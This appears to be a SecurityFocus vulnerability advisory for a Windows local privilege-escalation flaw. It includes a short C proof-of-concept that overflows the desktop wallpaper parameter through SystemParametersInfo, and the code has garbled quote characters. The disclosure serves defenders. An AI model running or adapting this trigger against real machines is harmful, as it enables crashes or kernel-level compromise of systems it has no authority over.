source: http://www.securityfocus.com/bid/35120/info

Microsoft Windows is prone to a local privilege-escalation vulnerability.

Attackers may exploit this issue to execute arbitrary code with kernel-level privileges. Successful exploits will facilitate the complete compromise of affected computers. Failed exploit attempts will result in a denial-of-service condition. 

#include <windows.h>
int main()
{
 WCHAR c[1000] = {0};
 memset(c, �c�, 1000);
 SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (PVOID)c, 0);

 WCHAR b[1000] = {0};
 SystemParametersInfo(SPI_GETDESKWALLPAPER, 1000, (PVOID)b, 0);
 return 0;
}